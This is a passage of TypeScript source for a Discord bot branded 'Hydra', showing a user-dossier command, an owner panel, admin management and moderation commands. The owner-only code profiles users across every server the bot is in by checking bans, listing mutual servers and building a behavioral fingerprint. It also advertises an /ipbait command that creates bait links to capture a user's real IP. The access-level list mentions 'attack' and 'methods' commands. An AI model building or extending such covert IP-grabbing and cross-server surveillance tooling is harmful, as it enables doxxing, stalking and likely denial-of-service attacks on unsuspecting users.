  embedTech.addFields({
    name: "📊 SCORE DE RISCO",
    value: `\`[${scoreBar}]\` ${risk.score}/100 — ${risk.level}`,
    inline: false,
  });

  if (member?.premiumSince) {
    embedTech.addFields({
      name: "💎 BOOST",
      value: `Boostando desde <t:${Math.floor(member.premiumSince.getTime() / 1000)}:F> (<t:${Math.floor(member.premiumSince.getTime() / 1000)}:R>)`,
      inline: false,
    });
  }

  // ── Option 10: Cross-guild ban check (owner only) ────────────────────────
  const crossBanResults: string[] = [];
  const isCallerOwner = isOwner(interaction.user.id, interaction.user.username);
  if (isCallerOwner && targetUser.id !== interaction.user.id) {
    const banChecks = await Promise.allSettled(
      botClient!.guilds.cache.map(async (g: import("discord.js").Guild) => {
        const ban = await g.bans.fetch(targetUser.id).catch(() => null);
        return ban ? `❌ Banido em **${g.name}** — ${ban.reason ?? "Sem motivo"}` : `✅ Livre em **${g.name}**`;
      })
    );
    for (const r of banChecks) {
      if (r.status === "fulfilled") crossBanResults.push(r.value);
    }
  }

  if (crossBanResults.length > 0) {
    embedTech.addFields({
      name: "🔍 CROSS-GUILD BAN CHECK (Option 10)",
      value: crossBanResults.slice(0, 15).join("\n").slice(0, 1024) || "*Sem dados*",
      inline: false,
    });
  }

  // ── OSINT: Mutual servers + shared metadata (owner only) ─────────────────
  if (isCallerOwner && targetUser.id !== interaction.user.id) {
    const mutualGuilds: string[] = [];
    for (const g of botClient!.guilds.cache.values()) {
      try {
        await g.members.fetch({ user: targetUser.id });
        mutualGuilds.push(`**${g.name}** (\`${g.id}\`) — ${g.memberCount ?? "?"} membros`);
      } catch { /* not in this guild */ }
    }
    embedTech.addFields({
      name: `🌐 SERVIDORES MÚTUOS (${mutualGuilds.length})`,
      value: mutualGuilds.length > 0
        ? mutualGuilds.slice(0, 10).join("\n") + (mutualGuilds.length > 10 ? `\n*...e mais ${mutualGuilds.length - 10}*` : "")
        : "*Nenhum servidor mútuo detectado — ou privileged intent não habilitado*",
      inline: false,
    });
  }

  // ── Behavioral fingerprint (open source intelligence) ────────────────────
  const behaviorLines: string[] = [];
  if (fetched.bot) behaviorLines.push("🤖 **Conta bot** — perfil autônomo, sem comportamento humano");
  if (hasDefaultAvatar) behaviorLines.push("📷 **Avatar padrão** — nunca personalizou a conta");
  if (accountAgeDays < 30) behaviorLines.push(`⏱️ **Conta nova** — criada há apenas ${accountAgeDays} dias`);
  if (roleCount === 0 && interaction.guild) behaviorLines.push("🎭 **Sem cargos** — membro sem nenhuma função atribuída");
  if (totalInviteUses > 10) behaviorLines.push(`📬 **${totalInviteUses}** pessoas convidadas — recrutador ativo`);
  if (isAdmin) behaviorLines.push("👑 **Administrador** — controle total do servidor");
  if (member?.isCommunicationDisabled()) behaviorLines.push("⏳ **Em timeout ativo** — foi sancionado recentemente");
  if (member?.premiumSince) behaviorLines.push("💎 **Server booster** — investimento genuíno no servidor");
  if (streamingActivity) behaviorLines.push("📺 **Em stream ativo** — criador de conteúdo");
  if (listeningActivity?.name === "Spotify") behaviorLines.push("🎵 **Ouvindo Spotify** — usuário com integração configurada");
  if (behaviorLines.length > 0) {
    embedTech.addFields({
      name: "🧠 PERFIL COMPORTAMENTAL",
      value: behaviorLines.join("\n"),
      inline: false,
    });
  }

  // ── IP Tracker quick-link hint (owner only) ────────────────────────────────
  if (isCallerOwner && !fetched.bot) {
    embedTech.addFields({
      name: "🪤 IP TRACKER",
      value: `Use \`/ipbait target:@${fetched.username}\` para gerar um link bait com resultado capturando o IP real deste usuário.`,
      inline: false,
    });
  }

  embedIdentity.setFooter({ text: `${AUTHOR} • Hydra Intelligence Division ▸ Página 1/3 — Use as setas para navegar` });
  embedServer.setFooter({ text: `${AUTHOR} • Hydra Intelligence Division ▸ Página 2/3 — Servidor & Papéis` });
  embedTech
    .setFooter({ text: `${AUTHOR} • Hydra Intelligence Division ▸ Página 3/3 — Técnico & Risco` })
    .setTimestamp();

  await sendPaginated(interaction, [embedIdentity, embedServer, embedTech]);
}

// ═══════════════════════════════════════════════════════════════════════════
// PANEL COMMAND HANDLER
// ═══════════════════════════════════════════════════════════════════════════
async function handlePanel(interaction: ChatInputCommandInteraction): Promise<void> {
  const callerUsername = interaction.user.username;
  const callerId = interaction.user.id;

  if (!isOwner(callerId, callerUsername) && !isMod(callerId, callerUsername)) {
    await interaction.reply({
      embeds: [buildErrorEmbed("⛔ ACESSO NEGADO", `**${callerUsername}** — Apenas donos e mods autorizados podem usar este painel.\n\n*"Hydra não reconhece você como aliado."*`)],
      flags: MessageFlags.Ephemeral,
    });
    return;
  }

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });
  const sub = interaction.options.getSubcommand();

  // ── STATUS ──────────────────────────────────────────────────────────────
  if (sub === "status") {
    const mem = process.memoryUsage();
    const upMs = process.uptime() * 1000;
    const h = Math.floor(upMs / 3_600_000), m = Math.floor((upMs % 3_600_000) / 60_000), s = Math.floor((upMs % 60_000) / 1000);
    const embed = new EmbedBuilder()
      .setColor(COLORS.PURPLE)
      .setTitle("👁️ PAINEL DE CONTROLE — STATUS DO SISTEMA")
      .setDescription(`*"Eu não apenas ocupo um lugar — eu dirijo o destino."*`)
      .addFields(
        { name: "🤖 BOT", value: `**Tag:** ${botClient!.user?.tag ?? "?"}\n**ID:** \`${botClient!.user?.id ?? "?"}\`\n**Ping:** \`${botClient!.ws.ping}ms\``, inline: true },
        { name: "⏱️ UPTIME", value: `\`${h}h ${m}m ${s}s\``, inline: true },
        { name: "💾 RAM", value: `RSS: \`${(mem.rss / 1_048_576).toFixed(1)}MB\`\nHeap: \`${(mem.heapUsed / 1_048_576).toFixed(1)}/${(mem.heapTotal / 1_048_576).toFixed(1)}MB\``, inline: true },
        { name: "🌐 GUILDS", value: `\`${botClient!.guilds.cache.size}\` servidores`, inline: true },
        { name: "👥 USUÁRIOS CACHEADOS", value: `\`${botClient!.users.cache.size}\``, inline: true },
        { name: "📡 SHARD", value: `\`${botClient!.shard?.ids.join(", ") ?? "0"}\``, inline: true },
        { name: "🔐 BOOTSTRAP OWNER", value: `\`${BOOTSTRAP_OWNER_USERNAME}\``, inline: false },
        { name: "👑 OWNERS", value: listPanelOwners().slice(0, 10).join("\n") || "*Nenhum owner extra*", inline: true },
        { name: "🛡️ MODS", value: listPanelMods().slice(0, 10).join("\n") || "*Nenhum mod*", inline: true },
      )
      .setTimestamp()
      .setFooter({ text: AUTHOR });
    await interaction.editReply({ embeds: [embed] });
    return;
  }

  // ── GUILDS ───────────────────────────────────────────────────────────────
  if (sub === "guilds") {
    if (!isOwner(callerId, callerUsername)) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔", "Apenas donos podem listar servidores.")] });
      return;
    }
    const allGuilds = [...botClient!.guilds.cache.values()];
    const CHUNK_SIZE = 15;
    const totalPages = Math.max(1, Math.ceil(allGuilds.length / CHUNK_SIZE));
    const guildPages: EmbedBuilder[] = [];
    for (let i = 0; i < allGuilds.length; i += CHUNK_SIZE) {
      const chunk = allGuilds.slice(i, i + CHUNK_SIZE);
      guildPages.push(new EmbedBuilder()
        .setColor(COLORS.PURPLE)
        .setTitle(`🌐 SERVIDORES — ${allGuilds.length} total`)
        .setDescription(chunk.map(g => `**${g.name}** • \`${g.id}\` • ${g.memberCount ?? "?"} membros`).join("\n"))
        .setFooter({ text: `${AUTHOR} ▸ Página ${Math.ceil((i + 1) / CHUNK_SIZE)}/${totalPages}` })
      );
    }
    if (guildPages.length === 0) guildPages.push(new EmbedBuilder().setColor(COLORS.PURPLE).setTitle("🌐 SERVIDORES").setDescription("Nenhum servidor."));
    await sendPaginated(interaction, guildPages);
    return;
  }

  // ── WHITELIST ─────────────────────────────────────────────────────────────
  if (sub === "whitelist") {
    if (!isOwner(callerId, callerUsername)) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔", "Apenas donos podem gerenciar whitelist.")] });
      return;
    }
    const action = interaction.options.getString("action", true);
    const target = interaction.options.getUser("user");

    if (action === "list") {
      const embed = new EmbedBuilder()
        .setColor(COLORS.PURPLE)
        .setTitle("📋 WHITELIST DO PAINEL")
        .addFields(
          { name: "👑 Owners", value: [`\`${BOOTSTRAP_OWNER_USERNAME}\` (bootstrap)`, ...listPanelOwners()].join("\n") || "Nenhum", inline: false },
          { name: "🛡️ Mods", value: listPanelMods().join("\n") || "Nenhum", inline: false },
        )
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    if (!target) {
      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Especifique um usuário.")] });
      return;
    }

    if (action === "add-owner") { addPanelOwner(target.id); await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0x00FF00).setTitle("✅ Owner adicionado").setDescription(`${target.tag} (\`${target.id}\`) agora é owner do painel.`)] }); }
    else if (action === "add-mod") { addPanelMod(target.id); await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0x00FF00).setTitle("✅ Mod adicionado").setDescription(`${target.tag} (\`${target.id}\`) agora é mod do painel.`)] }); }
    else if (action === "remove") {
      removePanelOwner(target.id); removePanelMod(target.id);
      await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0xFF8800).setTitle("✅ Acesso removido").setDescription(`${target.tag} removido da whitelist.`)] });
    }
    return;
  }

  // ── BROADCAST ─────────────────────────────────────────────────────────────
  if (sub === "broadcast") {
    if (!isOwner(callerId, callerUsername)) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔", "Apenas donos podem fazer broadcast.")] });
      return;
    }
    const message = interaction.options.getString("message", true);
    let sent = 0, failed = 0;
    for (const guild of botClient!.guilds.cache.values()) {
      try {
        const logChId = getLogChannelId(guild.id);
        if (!logChId) continue;
        const ch = guild.channels.cache.find((c: import("discord.js").GuildBasedChannel) => c.id === logChId && c.isTextBased());
        if (ch && ch.isTextBased()) {
          await ch.send({ embeds: [new EmbedBuilder().setColor(COLORS.PURPLE).setTitle("📢 BROADCAST — HYDRA").setDescription(message).setTimestamp()] });
          sent++;
        }
      } catch { failed++; }
    }
    await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0x00FF00).setTitle("📢 BROADCAST ENVIADO").setDescription(`Enviado: \`${sent}\` | Falhou: \`${failed}\``)] });
    return;
  }

  // ── LEAVE ─────────────────────────────────────────────────────────────────
  if (sub === "leave") {
    if (!isOwner(callerId, callerUsername)) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔", "Apenas donos podem forçar saída.")] });
      return;
    }
    const guildId = interaction.options.getString("guildid", true);
    const guild = botClient!.guilds.cache.get(guildId);
    if (!guild) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", `Servidor \`${guildId}\` não encontrado.`)] }); return; }
    const name = guild.name;
    await guild.leave();
    await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0xFF8800).setTitle("🚪 SAÍDA FORÇADA").setDescription(`Bot saiu de **${name}** (\`${guildId}\`)`)] });
    return;
  }

}

// ═══════════════════════════════════════════════════════════════════════════
// /admins COMMAND HANDLER — gerenciar owners e admins do bot
// ═══════════════════════════════════════════════════════════════════════════
async function handleAdmins(interaction: ChatInputCommandInteraction): Promise<void> {
  const callerId   = interaction.user.id;
  const callerName = interaction.user.username;
  const callerIsOwner = isOwner(callerId, callerName);
  const callerIsMod   = isMod(callerId, callerName);

  if (!callerIsOwner && !callerIsMod) {
    await interaction.reply({
      embeds: [buildErrorEmbed("⛔ ACESSO NEGADO", `**${callerName}** — Apenas donos e admins autorizados podem usar este comando.\n\n*"O poder não é concedido — é tomado pelos dignos."*`)],
      flags: MessageFlags.Ephemeral,
    });
    return;
  }

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });
  const sub = interaction.options.getSubcommand();

  // ── LIST ──────────────────────────────────────────────────────────────────
  if (sub === "list") {
    const owners = listPanelOwners();
    const mods   = listPanelMods();

    const ownerDisplay = [
      `\`${BOOTSTRAP_OWNER_USERNAME}\` — 👑 **Bootstrap Owner** (hardcoded, acesso máximo)`,
      ...owners.map(id => `<@${id}> — \`${id}\``),
    ];
    const modDisplay = mods.length > 0
      ? mods.map(id => `<@${id}> — \`${id}\``)
      : ["*Nenhum admin adicionado*"];

    const embed = new EmbedBuilder()
      .setColor(COLORS.PURPLE)
      .setTitle("👑 PAINEL DE ADMINISTRADORES — GEASS BRITÂNIA")
      .setDescription(`*"Aqueles que servem sob o olho da Hydra — os confiáveis da Order."*\n\n` +
        `**Total de owners:** \`${owners.length + 1}\` | **Total de admins:** \`${mods.length}\``)
      .addFields(
        {
          name: `👑 OWNERS (${owners.length + 1}) — Acesso Total`,
          value: ownerDisplay.join("\n").slice(0, 1024),
          inline: false,
        },
        {
          name: `🛡️ ADMINS (${mods.length}) — Acesso Limitado`,
          value: modDisplay.join("\n").slice(0, 1024),
          inline: false,
        },
        {
          name: "🔐 Níveis de Acesso",
          value: [
            "**👑 Owner** — acesso completo: ataques, painel, ipbait, whois, admins",
            "**🛡️ Admin** — acesso ao ipbait, whois, painel básico",
            "**🔵 Membro** — comandos públicos apenas (attack, methods, info, help)",
          ].join("\n"),
          inline: false,
        },
      )
      .setTimestamp()
      .setFooter({ text: `${AUTHOR} • Solicitado por ${callerName}` });

    await interaction.editReply({ embeds: [embed] });
    return;
  }

  // ── ADD-OWNER ─────────────────────────────────────────────────────────────
  if (sub === "add-owner") {
    if (!callerIsOwner) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔ PERMISSÃO INSUFICIENTE", "Apenas owners podem promover outros owners.")] });
      return;
    }
    const target = interaction.options.getUser("user", true);
    if (target.id === callerId) {
      await interaction.editReply({ embeds: [buildErrorEmbed("AVISO", "Você já é owner.")] });
      return;
    }
    addPanelOwner(target.id);
    await interaction.editReply({
      embeds: [new EmbedBuilder()
        .setColor(0xFFD700)
        .setTitle("👑 OWNER ADICIONADO")
        .setDescription(`<@${target.id}> (\`${target.username}\`) agora tem acesso de **owner** ao bot.\n\n*"Um novo aliado da Hydra foi reconhecido."*`)
        .addFields({ name: "Adicionado por", value: `<@${callerId}> (\`${callerName}\`)`, inline: true })
        .setTimestamp()
        .setFooter({ text: AUTHOR })],
    });
    console.log(`[ADMINS] 👑 ${target.username} (${target.id}) promovido a owner por ${callerName} (${callerId})`);
    return;
  }

  // ── ADD-ADMIN ─────────────────────────────────────────────────────────────
  if (sub === "add-admin") {
    if (!callerIsOwner) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔ PERMISSÃO INSUFICIENTE", "Apenas owners podem adicionar admins.")] });
      return;
    }
    const target = interaction.options.getUser("user", true);
    if (isOwner(target.id, target.username)) {
      await interaction.editReply({ embeds: [buildErrorEmbed("AVISO", "Este usuário já é owner — nível superior ao de admin.")] });
      return;
    }
    addPanelMod(target.id);
    await interaction.editReply({
      embeds: [new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle("🛡️ ADMIN ADICIONADO")
        .setDescription(`<@${target.id}> (\`${target.username}\`) agora é **admin** autorizado do bot.\n\n*"Mais um soldado da Order — bem-vindo ao Geass."*`)
        .addFields(
          { name: "Adicionado por", value: `<@${callerId}> (\`${callerName}\`)`, inline: true },
          { name: "Acesso concedido", value: "ipbait, whois, painel básico", inline: true },
        )
        .setTimestamp()
        .setFooter({ text: AUTHOR })],
    });
    console.log(`[ADMINS] 🛡️ ${target.username} (${target.id}) adicionado como admin por ${callerName} (${callerId})`);
    return;
  }

  // ── REMOVE ────────────────────────────────────────────────────────────────
  if (sub === "remove") {
    if (!callerIsOwner) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔ PERMISSÃO INSUFICIENTE", "Apenas owners podem remover acessos.")] });
      return;
    }
    const target = interaction.options.getUser("user", true);
    if (target.username === BOOTSTRAP_OWNER_USERNAME) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔ IMPOSSÍVEL", `O bootstrap owner \`${BOOTSTRAP_OWNER_USERNAME}\` é hardcoded e não pode ser removido.`)] });
      return;
    }
    const wasOwner = listPanelOwners().includes(target.id);
    const wasMod   = listPanelMods().includes(target.id);
    removePanelOwner(target.id);
    removePanelMod(target.id);

    if (!wasOwner && !wasMod) {
      await interaction.editReply({ embeds: [buildErrorEmbed("AVISO", `<@${target.id}> não está na lista de owners nem admins.`)] });
      return;
    }

    const removedRole = wasOwner ? "owner" : "admin";
    await interaction.editReply({
      embeds: [new EmbedBuilder()
        .setColor(0xFF6B6B)
        .setTitle("➖ ACESSO REVOGADO")
        .setDescription(`<@${target.id}> (\`${target.username}\`) teve o acesso de **${removedRole}** removido.\n\n*"A Hydra não perdoa aqueles que perdem a confiança."*`)
        .addFields({ name: "Removido por", value: `<@${callerId}> (\`${callerName}\`)`, inline: true })
        .setTimestamp()
        .setFooter({ text: AUTHOR })],
    });
    console.log(`[ADMINS] ➖ ${target.username} (${target.id}) removido da lista de ${removedRole} por ${callerName} (${callerId})`);
    return;
  }
}

async function handleAdmin(interaction: ChatInputCommandInteraction): Promise<void> {
  const sub = interaction.options.getSubcommand();

  // ── BAN ──────────────────────────────────────────────────────────────────
  if (sub === "ban") {
    const target = interaction.options.getUser("user", true);
    const reason = interaction.options.getString("reason") ?? "Por ordem de Hydra.";
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.guild) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Este comando só funciona em servidores.")] }); return; }
    if (target.id === interaction.user.id) { await interaction.editReply({ embeds: [buildErrorEmbed("GEASS NEGADO", "Até um rei não pode banir a si mesmo.")] }); return; }

    try {
      await interaction.guild.members.ban(target.id, { reason: `[Hydra] ${reason}` });
      const embed = new EmbedBuilder()
        .setColor(0xC0392B)
        .setTitle("⚔️ BANISHMENT DECREE — GEASS ABSOLUTE")
        .setDescription(getRandQuote(HYDRA_BAN_QUOTES))
        .addFields(
          { name: "⛔ Banished Subject", value: `${target.tag} (${target.id})`, inline: true },
          { name: "👁️ Decreed By",      value: `${interaction.user.tag}`,        inline: true },
          { name: "📜 Reason",           value: reason,                           inline: false },
        )
        .setThumbnail(target.displayAvatarURL())
        .setFooter({ text: AUTHOR })
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
      if (interaction.guildId) void sendAdminLog(interaction.guildId, embed);
      console.log(`[ADMIN BAN] ${interaction.user.tag} banned ${target.tag} — ${reason}`);
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("BANISHMENT FAILED", String(e))] });
    }
    return;
  }

  // ── UNBAN ────────────────────────────────────────────────────────────────
  if (sub === "unban") {
    const userId = interaction.options.getString("userid", true).trim();
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.guild) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Este comando só funciona em servidores.")] }); return; }

    try {
      await interaction.guild.members.unban(userId, `[Hydra] Pardon by ${interaction.user.tag}`);
      const embed = new EmbedBuilder()
        .setColor(0x2ecc71)
        .setTitle("🕊️ PARDON GRANTED — BY ROYAL DECREE")
        .setDescription(`*"Even kings must sometimes show mercy — when it serves the strategy."*`)
        .addFields(
          { name: "✅ Pardoned ID",  value: `\`${userId}\``,         inline: true },
          { name: "👁️ Pardoned By", value: `${interaction.user.tag}`, inline: true },
        )
        .setFooter({ text: AUTHOR })
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("PARDON FAILED", `Could not unban \`${userId}\`. Ensure the ID is correct.\n\`${String(e).slice(0, 200)}\``)] });
    }
    return;
  }

  // ── CLEAR ────────────────────────────────────────────────────────────────
  if (sub === "clear") {
    const amount = interaction.options.getInteger("amount", true);
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.channel || !interaction.channel.isTextBased()) {
      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Canal de texto não encontrado.")] }); return;
    }

    try {
      const channel = interaction.channel as import("discord.js").TextChannel;

      // ── Pre-flight: verify bot has required permissions in this channel ──
      const botMember = interaction.guild?.members.me;
      if (botMember) {
        const botPerms = channel.permissionsFor(botMember);
        const missing: string[] = [];
        if (!botPerms?.has(PermissionFlagsBits.ManageMessages))     missing.push("`Manage Messages`");
        if (!botPerms?.has(PermissionFlagsBits.ReadMessageHistory))  missing.push("`Read Message History`");
        if (missing.length > 0) {
          await interaction.editReply({ embeds: [buildErrorEmbed(
            "⚠️ BOT SEM PERMISSÕES",
            `O bot não tem as permissões necessárias em <#${channel.id}>.\n\n` +
            `**Faltando:**\n${missing.join("\n")}\n\n` +
            `**Como corrigir:**\n` +
            `Vá em **Configurações do Servidor → Roles → [Cargo do Bot]** ` +
            `e ative as permissões acima. Ou edite as permissões do canal diretamente.`
          )] });
          return;
        }
      }

      const deleted = await channel.bulkDelete(amount, true); // true = skip >14d old
      const embed = new EmbedBuilder()
        .setColor(0xf39c12)
        .setTitle("🗑️ EVIDENCE ERASED — GEASS CLEAN SWEEP")
        .setDescription(getRandQuote(HYDRA_CLEAR_QUOTES))
        .addFields(
          { name: "🗑️ Deleted",   value: `**${deleted.size}** messages`, inline: true },
          { name: "📍 Channel",   value: `<#${channel.id}>`,              inline: true },
          { name: "👁️ By Order", value: `${interaction.user.tag}`,        inline: true },
        )
        .setFooter({ text: `${AUTHOR} • Messages older than 14 days cannot be bulk deleted` })
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
      console.log(`[ADMIN CLEAR] ${interaction.user.tag} deleted ${deleted.size} messages in #${channel.name}`);
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("CLEAR FAILED", String(e))] });
    }
    return;
  }

  // ── WARN ─────────────────────────────────────────────────────────────────
  if (sub === "warn") {
    const target = interaction.options.getUser("user", true);
    const reason = interaction.options.getString("reason", true);
    await interaction.deferReply();

    const embed = new EmbedBuilder()
      .setColor(0xe67e22)
      .setTitle("⚠️ GEASS WARNING — FINAL NOTICE")
      .setDescription(getRandQuote(HYDRA_WARN_QUOTES))
      .addFields(
        { name: "⚠️ Warned Subject", value: `${target} (${target.tag})`, inline: true },
        { name: "👁️ Issued By",      value: `${interaction.user.tag}`,    inline: true },
        { name: "📜 Reason",          value: reason,                       inline: false },
      )
      .setThumbnail(target.displayAvatarURL())
      .setFooter({ text: `${AUTHOR} • Next violation results in mute or ban` })
      .setTimestamp();
    await interaction.editReply({ embeds: [embed] });

    // Attempt to DM the warned user
    try {
      const dmEmbed = new EmbedBuilder()
        .setColor(0xe67e22)
        .setTitle(`⚠️ You received a warning in ${interaction.guild?.name ?? "the server"}`)
        .setDescription(`*"You have been warned by the king's Geass. Do not test my patience."*`)
        .addFields({ name: "📜 Reason", value: reason })
        .setFooter({ text: AUTHOR })
        .setTimestamp();
      await target.send({ embeds: [dmEmbed] });
    } catch { /* DM closed */ }
    console.log(`[ADMIN WARN] ${interaction.user.tag} warned ${target.tag} — ${reason}`);
    return;
  }

  // ── MUTE (timeout) ───────────────────────────────────────────────────────
  if (sub === "mute") {
    const target  = interaction.options.getUser("user", true);
    const minutes = interaction.options.getInteger("duration") ?? 10;
    const reason  = interaction.options.getString("reason") ?? "Por ordem de Hydra.";
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.guild) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Este comando só funciona em servidores.")] }); return; }

    try {
      const member = await interaction.guild.members.fetch(target.id);
      await member.timeout(minutes * 60_000, `[Hydra] ${reason}`);
      const embed = new EmbedBuilder()
        .setColor(0x9b59b6)
        .setTitle("🔇 SILENCED BY GEASS — ROYAL DECREE")
        .setDescription(getRandQuote(HYDRA_MUTE_QUOTES))
        .addFields(
          { name: "🔇 Silenced Subject", value: `${target.tag}`,                                   inline: true },
          { name: "⏱️ Duration",         value: `**${minutes}** minute${minutes > 1 ? "s" : ""}`, inline: true },
          { name: "👁️ By Order",         value: `${interaction.user.tag}`,                         inline: true },
          { name: "📜 Reason",            value: reason,                                            inline: false },
        )
        .setThumbnail(target.displayAvatarURL())
        .setFooter({ text: AUTHOR })
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
      console.log(`[ADMIN MUTE] ${interaction.user.tag} muted ${target.tag} for ${minutes}m — ${reason}`);
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("MUTE FAILED", String(e))] });
    }
    return;
  }

  // ── UNMUTE ───────────────────────────────────────────────────────────────
  if (sub === "unmute") {
    const target = interaction.options.getUser("user", true);
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.guild) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Este comando só funciona em servidores.")] }); return; }

    try {
      const member = await interaction.guild.members.fetch(target.id);
      await member.timeout(null);
      const embed = new EmbedBuilder()
        .setColor(0x2ecc71)
        .setTitle("🔊 VOICE RESTORED — BY GEASS DECREE")
        .setDescription(`*"Your silence served its purpose. Rise, and speak carefully."*`)
        .addFields(
          { name: "🔊 Restored",   value: `${target.tag}`,         inline: true },
          { name: "👁️ By Order",  value: `${interaction.user.tag}`, inline: true },
        )
        .setFooter({ text: AUTHOR })
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
      if (interaction.guildId) void sendAdminLog(interaction.guildId, embed);
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("UNMUTE FAILED", String(e))] });
    }
    return;
  }

  // ── KICK ─────────────────────────────────────────────────────────────────
  if (sub === "kick") {
    const target = interaction.options.getUser("user", true);
    const reason = interaction.options.getString("reason") ?? "Por ordem de Hydra.";
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.guild) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Este comando só funciona em servidores.")] }); return; }
    if (target.id === interaction.user.id) { await interaction.editReply({ embeds: [buildErrorEmbed("GEASS NEGADO", "Até um rei não pode expulsar a si mesmo.")] }); return; }

    try {
      const member = await interaction.guild.members.fetch(target.id);
      await member.kick(`[Hydra] ${reason}`);
      const embed = new EmbedBuilder()
        .setColor(0xE67E22)
        .setTitle("👢 EXPULSION DECREE — GEASS ORDER")
        .setDescription(`*"You are banished from my presence — for now. Consider this a mercy compared to what awaits repeat offenders."*`)
        .addFields(
          { name: "👢 Expelled Subject", value: `${target.tag} (${target.id})`, inline: true },
          { name: "👁️ Decreed By",      value: `${interaction.user.tag}`,        inline: true },
          { name: "📜 Reason",           value: reason,                           inline: false },
        )
        .setThumbnail(target.displayAvatarURL())
        .setFooter({ text: `${AUTHOR} • Unlike a ban, they may return` })
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
      if (interaction.guildId) void sendAdminLog(interaction.guildId, embed);
      console.log(`[ADMIN KICK] ${interaction.user.tag} kicked ${target.tag} — ${reason}`);
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("KICK FAILED", String(e))] });
    }
    return;
  }

  // ── SLOWMODE ─────────────────────────────────────────────────────────────
  if (sub === "slowmode") {
    const seconds = interaction.options.getInteger("seconds", true);
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.channel || !interaction.channel.isTextBased()) {
      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Canal de texto não encontrado.")] }); return;
    }

    try {
      const ch = interaction.channel as import("discord.js").TextChannel;
      await ch.setRateLimitPerUser(seconds, `[Hydra] Slowmode set by ${interaction.user.tag}`);
      const embed = new EmbedBuilder()
        .setColor(seconds === 0 ? 0x2ecc71 : 0x9b59b6)
        .setTitle(seconds === 0 ? "🔓 SLOWMODE DISABLED" : "🐢 SLOWMODE ENGAGED — GEASS THROTTLE")
        .setDescription(
          seconds === 0
            ? `*"Speed and efficiency — the kingdom flows unimpeded once more."*`
            : `*"I control the pace of this battlefield. ${seconds}s between each advance — by my Geass."*`
        )
        .addFields(
          { name: "⏱️ Delay",    value: seconds === 0 ? "Disabled" : `**${seconds}s** between messages`, inline: true },
          { name: "📍 Channel",  value: `<#${ch.id}>`,                                                   inline: true },
          { name: "👁️ Set By",  value: `${interaction.user.tag}`,                                        inline: true },
        )
        .setFooter({ text: AUTHOR })
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
      if (interaction.guildId) void sendAdminLog(interaction.guildId, embed);
      console.log(`[ADMIN SLOWMODE] ${interaction.user.tag} set slowmode ${seconds}s in #${ch.name}`);
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("SLOWMODE FAILED", String(e))] });
    }
    return;
  }

  // ── LOGCHANNEL ────────────────────────────────────────────────────────────
  if (sub === "logchannel") {
    const channel = interaction.options.getChannel("channel", true);
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    if (!interaction.guildId) { await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Este comando só funciona em servidores.")] }); return; }

    setLogChannelId(interaction.guildId, channel.id);
    const embed = new EmbedBuilder()
      .setColor(COLORS.GOLD)
      .setTitle("📋 MOD LOG CHANNEL — CONFIGURED")
      .setDescription(`*"All intelligence shall be recorded. Hydra sees everything, and now so shall this channel."*`)
      .addFields(
        { name: "📋 Log Channel", value: `<#${channel.id}>`, inline: true },
        { name: "👁️ Set By",     value: `${interaction.user.tag}`, inline: true },
      )
      .setFooter({ text: `${AUTHOR} • All mod actions will be logged here` })
      .setTimestamp();
    await interaction.editReply({ embeds: [embed] });
    // Send a confirmation to the new log channel too
    void sendAdminLog(interaction.guildId, new EmbedBuilder()
      .setColor(COLORS.GOLD)
      .setTitle("📋 THIS IS NOW THE MOD LOG CHANNEL")
      .setDescription(`*"The Hydra Intelligence Network has chosen this channel. All future mod actions will appear here."*`)
      .addFields({ name: "👁️ Configured By", value: `${interaction.user.tag}` })
      .setFooter({ text: AUTHOR })
      .setTimestamp()
    );
